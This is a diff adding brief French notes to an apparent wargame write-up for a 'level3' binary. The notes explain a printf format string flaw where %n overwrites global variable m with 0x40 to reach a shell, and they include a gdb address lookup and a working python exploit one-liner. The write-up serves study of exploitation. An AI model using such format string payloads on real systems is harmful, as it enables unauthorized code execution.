@@ -1,1 +1,9 @@
+ici on viens ce servir d'une faille de securite dans la fonction printf avec le %n.
+le %n va ecrire a l'adresse passe en debut de fonction, le nombre de caractere qu'elle aura ecrit.
+on va donc affecter a la variable global _m la valeur 0x40 afin de valider la condition pour lancer le shell
+
+addresse de la variable m
+(gdb) x 0x804988c
+0x804988c <m>:	0x00000000
+
 cat <(python -c 'print("\x8c\x98\x04\x08" + "A" * 60 + "%4$n")') - | ./level3
